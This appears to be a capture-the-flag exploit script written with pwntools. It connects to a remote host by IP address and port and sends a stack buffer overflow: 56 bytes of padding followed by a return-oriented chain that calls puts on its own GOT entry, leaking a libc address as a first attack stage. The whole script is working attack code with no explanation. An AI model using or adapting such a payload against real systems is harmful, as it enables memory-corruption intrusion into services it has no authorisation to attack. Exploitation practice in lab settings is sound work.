from pwn import *

elf = ELF("./app")
p = remote("51.124.222.205", 13370)

raw_input("DEBUG")

pop_rdi = 0x000000000000161b

got_puts = elf.got['puts']

p.recvuntil("DISCLAIMER: All your memories will be saved at ")

payload = b"A"*56
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.sym['puts'])

print(hex(got_puts))

p.sendline(b"1")

sleep(0.1)

p.sendline(payload)

p.interactive()
